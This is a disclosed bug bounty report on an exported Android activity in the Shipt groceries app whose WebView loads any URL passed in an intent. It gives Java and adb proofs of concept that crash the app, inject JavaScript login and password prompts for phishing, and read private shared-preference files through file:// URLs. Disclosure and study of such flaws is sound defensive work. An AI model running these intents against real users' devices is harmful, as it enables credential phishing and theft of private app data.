---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '414101'
original_report_id: '414101'
title: Vulnerabilities in exported activity WebView
team_handle: shipt
created_at: '2018-09-25T17:04:42.435Z'
disclosed_at: '2021-12-13T19:30:50.928Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 41
asset_identifier: com.shipt.groceries
asset_type: GOOGLE_PLAY_APP_ID
max_severity: critical
tags:
- hackerone
---

# Vulnerabilities in exported activity WebView

## Metadata

- HackerOne Report ID: 414101
- Weakness: 
- Program: shipt
- Disclosed At: 2021-12-13T19:30:50.928Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello, i want to report the vulnerability found,
Since the following activity `com.pushio.manager.iam.ui.PushIOMessageViewActivity` has `exported=true` it can be exploited by 3rd parties.

### Vulnerability
`com.pushio.manager.iam.ui.PushIOMessageViewActivity` has exported set to true making the activity vulnerable.
`AndroidManifest.xml`
```xml
        <activity android:name="com.pushio.manager.iam.ui.PushIOMessageViewActivity" android:theme="@android:style/Theme.Translucent.NoTitleBar">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="@string/responsys_api_key"/>
            </intent-filter>
        </activity>
```
A problem in a class `com.pushio.manager.iam.ui.PushIOMessageViewActivity` that allows you to interact with WebView:
```java
protected void onStart() {
...
 Bundle extras = getIntent().getExtras();
        PIOLogger.d("PIOMVA oS extras: " + extras);
        if (extras != null) {
            final String content = extras.getString(Param.CONTENT);
            final String url = extras.getString("url");
            String viewType = extras.getString("type");
...
if (TextUtils.isEmpty(viewType)) {
                PIOLogger.w("PIOMVA oS view type not found, closing window...");
                finish();
                return;
            } else if (viewType.equalsIgnoreCase(PushIOMessageViewType.ALERT.toString())) {
...
 public void run() {
                        try {
                            if (PushIOMessageViewActivity.this.mActivityWeakReference != null && PushIOMessageViewActivity.this.mActivityWeakReference.get() != null && !((Activity) PushIOMessageViewActivity.this.mActivityWeakReference.get()).isFinishing()) {
                                PushIOMessageViewActivity.this.mPopupWindow.showAtLocation(PushIOMessageViewActivity.this.mParentLayout, 17, 0, 0);
                                if (!TextUtils.isEmpty(content)) {
                                    PushIOMessageViewActivity.this.mWebView.loadDataWithBaseURL(null, content, "text/html", "utf-8", null);
                                } else if (TextUtils.isEmpty(url)) {
                                    PushIOMessageViewActivity.this.finish();
                                } else {
                                    PushIOMessageViewActivity.this.mWebView.loadUrl(url);//load custom url
                                }
                            }
                        } catch (BadTokenException e) {
                            PIOLogger.d("PIOMVA oSt " + e.getMessage());
                        }
```
With the help of a special intent, you can pass `if` blocks and load your own URL address or Javascript.
```java
    PushIOMessageViewActivity.this.mWebView.loadUrl(url);//load custom url
```
You can exploit this vulnerability via the console adb or through my application HunterExploit

PoC 1 - Kill Process - Allows you to stop the shipt process - The threat of information availability
Java PoC:
```java
Intent intent = new Intent("android.intent.action.VIEW");
intent.setClassName("com.shipt.groceries", "com.pushio.manager.iam.ui.PushIOMessageViewActivity");
intent.putExtra("url", "chrome://crash");
intent.putExtra("type", "alert");
startActivity(intent);
```
ADB Poc:
`adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a "android.intent.action.VIEW" --es "url" "chrome://crash" --es "type" "alert"`

PoC 2 - XSS - Allows a phishing attack
Java PoC:
```java
Intent intent = new Intent("android.intent.action.VIEW");
intent.setClassName("com.shipt.groceries", "com.pushio.manager.iam.ui.PushIOMessageViewActivity");
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
intent.putExtra("url", "javascript:{var Login = window.prompt(\"Authorization: Login\", \"Input Login\");var Password = window.prompt(\"Authorization: Password\", \"Input Password\"); alert('Interception of data: '+Login+' '+Password)}");
intent.putExtra("type", "alert");
Intent intentStart = new Intent(Intent.ACTION_MAIN);
intentStart.setComponent(new ComponentName("com.shipt.groceries", "com.shipt.groceries.MainActivity"));
startActivity(intentStart);
        try {
            Thread.sleep(10000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
 startActivity(intent);
```
ADB PoC:
`adb shell am start -n com.shipt.groceries/com.shipt.groceries.MainActivity
Wait for the application to load, and then run the following command
adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a "android.intent.action.VIEW" --es "url" "javascript:{window.prompt\(\'Authorization:Login\'\,\'Input_Login\'\)\;window.prompt\(\'Authorization:Password\'\,\'Input_Password\'\)}" --es "type" "alert"`

PoC 3 - LFI - Allows you to read confidential user files without root access - The threat of information Confidentiality
Java PoC:
```java
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.shipt.groceries", "com.pushio.manager.iam.ui.PushIOMessageViewActivity");
        intent.putExtra("url", "file:///data/data/com.shipt.groceries/shared_prefs/pushio_store.xml");
        intent.putExtra("type", "alert");

        startActivity(intent);
```
ADB PoC:
`adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a "android.intent.action.VIEW" --es "url" "file:///data/data/com.shipt.groceries/shared_prefs/pushio_store.xml" --es "type" "alert"`

PoC 4 - Read File or Load `android_asset`
Java PoC:
```java
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("com.shipt.groceries", "com.pushio.manager.iam.ui.PushIOMessageViewActivity");
        intent.putExtra("url", "file:///android_asset/www/index.html");
        intent.putExtra("type", "alert");

        startActivity(intent);
```
ADB PoC:
`adb shell am start -n com.shipt.groceries/com.pushio.manager.iam.ui.PushIOMessageViewActivity -a "android.intent.action.VIEW" --es "url" "file:///android_asset/www/index.html" --es "type" "alert"`
### Fix
Possible this article will help you:
https://pentestlab.blog/2017/02/12/android-webview-vulnerabilities/Vulnerability

## Impact

1. An attacker can load a javascript in the Shipt application by deceiving the user's trust.
2. Reading the user's personal files without root accesses.
3. Destroying the Shipt process.
4. Reading the application files from the android_asset file.
5. Access to WebView gives many possible exploits to an attacker.
In the files below there are PoC video and apk, to use the application HunterExploit install the application Shipt

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
